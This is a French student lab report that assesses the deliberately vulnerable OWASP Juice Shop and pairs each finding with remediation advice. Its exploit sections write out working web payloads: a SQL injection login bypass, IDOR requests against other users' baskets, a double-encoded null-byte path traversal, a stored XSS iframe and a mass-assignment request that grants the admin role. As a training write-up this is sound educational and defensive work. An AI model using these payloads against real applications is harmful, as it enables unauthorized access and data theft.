Contexte et objectifs

Ce travail pratique s'inscrit dans le module Sécurité des données de la Licence Cybersécurité (UNCHK). L'objectif est de réaliser une évaluation de sécurité complète de l'application OWASP Juice Shop, application web intentionnellement vulnérable utilisée comme cible d'entraînement.

V02 Sensitive Data Exposure — /api/Users
A02:2021 CVSS 7.5

L'endpoint /api/Users expose la liste complète des utilisateurs (emails, rôles, hashes de mots de passe) à tout utilisateur authentifié, sans restriction sur le rôle.

Impact : Un attaquant authentifié peut énumérer tous les comptes et récupérer les hashes MD5 des mots de passe pour des attaques hors-ligne.
  • evidence/responses/V02_users_list.json
V03 Broken Access Control — API Admin
A01:2021 CVSS 7.5

L'endpoint /api/Configs expose la configuration complète de l'application (clés OAuth, paramètres internes) sans vérification de rôle administrateur.

Extrait :

{
  "application": { "name": "OWASP Juice Shop", "domain": "juice-sh.op" },
  "googleOauth": { "clientId": "1005568560502-6hm16lef8oh46hr2d98vf2ohlnj4nfhq..." }
}
  • evidence/responses/V03_admin_config.json
V04 SQL Injection — Authentification
A03:2021 CVSS 9.8

Le formulaire de connexion (POST /rest/user/login) est vulnérable à une injection SQL classique permettant de contourner l'authentification.

POST /rest/user/login
Content-Type: application/json

{ "email": "' OR '1'='1'--", "password": "x" }
Résultat : HTTP 200 — JWT admin retourné. Accès administrateur complet sans connaître les identifiants.
  • evidence/requests/V04_sqli_request.txt
  • evidence/responses/V04_sqli_response.json

EXP-01 SQL Injection → JWT Admin
A03:2021 CVSS 9.8 ✅ Réussi

Objectif : Obtenir un JWT administrateur sans connaître le mot de passe.

POST /rest/user/login
Content-Type: application/json

{ "email": "' OR '1'='1'--", "password": "x" }

JWT décodé :

{
  "data": {
    "id": 1,
    "email": "admin@juice-sh.op",
    "role": "admin",
    "password": "0192023a7bbd73250516f069df18b500"
  },
  "bid": 1,
  "iat": 1786372620
}
Impact démontré : Accès administrateur complet. Le hash MD5 du mot de passe admin est exposé dans le JWT.

EXP-02 IDOR — Accès et modification des paniers
A01:2021 CVSS 8.1 ✅ Réussi

Objectif : Accéder et modifier le panier d'un autre utilisateur en manipulant l'ID de ressource.

Déroulement :

  1. Création d'un compte attaquant (attacker_7417@lab.local)
  2. Requête GET /rest/basket/1 avec le JWT attaquant → HTTP 200
  3. Lecture du panier de la victime (3 produits)
  4. Ajout d'un article dans le panier victime → HTTP 200
ProduitQtéPrix
Apple Juice (1000ml)21.99 €
Orange Juice (1000ml)32.99 €
Eggfruit Juice (500ml)18.99 €
Impact : Lecture et modification des paniers de tous les utilisateurs sans autorisation.

  • evidence/responses/EXP02_basket_1_stolen.json

EXP-03 Path Traversal /ftp/ + Bypass Null Byte
A01:2021 CVSS 7.5 ✅ Réussi

Objectif : Accéder à des fichiers sensibles via le répertoire /ftp/ et contourner le filtre d'extension.

FichierMéthodeRésultat
/ftp/acquisitions.mdGET direct✅ HTTP 200
/ftp/legal.mdGET direct✅ HTTP 200
/ftp/eastere.ggGET direct❌ HTTP 403
/ftp/coupons_2013.md.bakGET direct❌ HTTP 403
/ftp/package.json.bak%2500.mdNull byte bypass✅ HTTP 200
Technique null byte : Le filtre d'extension bloque les fichiers .bak. En ajoutant %2500 (null byte doublement encodé), l'application traite la requête comme si l'extension était .md et sert le fichier .bak.
  • evidence/http/EXP03_acquisitions.md.txt
  • evidence/http/EXP03_legal.md.txt
  • evidence/http/EXP03_nullbyte_package.json.bak.txt
EXP-04 XSS Stocké — Feedbacks
A03:2021 CVSS 7.2 ⚠️ Partiel

Objectif : Injecter un script JavaScript persistant dans les feedbacks.

POST /api/Feedbacks
Content-Type: application/json

{
  "comment": "<iframe src=\"javascript:alert(`XSS-LAB2-EXP04`)\"></iframe>",
  "rating": 1,
  "captchaId": 0,
  "captcha": ""
}
Résultat : HTTP 500 reçu — le payload a déclenché une erreur côté serveur. Une vérification via le navigateur (page /#/about) est nécessaire pour confirmer l'exécution.
  • evidence/requests/EXP04_xss_request.json
EXP-05 Mass Assignment — Escalade de privilège
A08:2021 CVSS 8.8 ⚠️ Partiel

Objectif : Créer un compte avec le rôle admin en exploitant une absence de filtrage des paramètres.

POST /api/Users
Content-Type: application/json

{
  "email": "attacker@lab.local",
  "password": "Test1234!",
  "passwordRepeat": "Test1234!",
  "role": "admin"
}
Résultat : Compte attaquant créé. Vérification du rôle assigné à compléter via /rest/user/whoami après connexion.
  • evidence/responses/EXP05_whoami_before.json

Recommandations

Corrections prioritaires — Critique

R01 Prévenir les injections SQL Critique
  • Utiliser des requêtes préparées (parameterized queries) ou un ORM avec protection intégrée
  • Valider et assainir toutes les entrées utilisateur côté serveur
  • Implémenter un WAF (Web Application Firewall)
R02 Corriger le Mass Assignment Critique
  • Définir explicitement les champs autorisés (allowlist) dans les schémas de validation
  • Ne jamais accepter role, isAdmin ou autres champs privilégiés depuis l'entrée utilisateur
  • Utiliser des DTOs (Data Transfer Objects) stricts

Corrections élevées

R03 Corriger les IDOR Élevé
  • Vérifier systématiquement que l'utilisateur est propriétaire de la ressource demandée
  • Remplacer les IDs séquentiels par des UUIDs non prédictibles
R04 Restreindre l'accès aux fichiers sensibles Élevé
  • Supprimer ou déplacer les fichiers sensibles hors de la racine web
  • Valider strictement les extensions côté serveur (ne pas se fier au chemin URL)
  • Neutraliser les null bytes dans la validation des chemins de fichiers
R05 Corriger le XSS Élevé
  • Encoder toutes les sorties HTML (output encoding)
  • Implémenter une Content-Security-Policy (CSP) stricte
  • Valider et assainir les entrées utilisateur (HTML encode, strip tags)

Améliorations de configuration

R06 Ajouter les en-têtes de sécurité Moyen 
Content-Security-Policy: default-src 'self'
Strict-Transport-Security: max-age=31536000; includeSubDomains
X-Content-Type-Options: nosniff
Access-Control-Allow-Origin: https://votre-domaine.com
R07 Protéger les endpoints sensibles Élevé
  • Restreindre /api/Users aux seuls administrateurs
  • Ne pas exposer la configuration complète via /api/Configs
  • Implémenter un contrôle d'accès basé sur les rôles (RBAC) cohérent
8

Conclusion

Ce laboratoire a permis d'identifier et d'exploiter 8 vulnérabilités réparties sur 5 catégories du Top 10 OWASP 2021. Les vulnérabilités les plus critiques — l'injection SQL (CVSS 9.8) et le Mass Assignment (CVSS 8.8) — permettent respectivement d'obtenir un accès administrateur complet et de créer des comptes avec des privilèges élevés.

L'exploitation enchaînée démontre qu'une seule faille peut servir de point d'entrée pour des attaques en cascade : l'injection SQL (EXP-01) fournit le JWT admin nécessaire pour accéder aux API protégées (V02, V03), qui révèlent à leur tour des informations facilitant d'autres attaques.

Ce laboratoire illustre concrètement pourquoi la sécurité doit être intégrée dès la conception (Security by Design) et non ajoutée a posteriori.
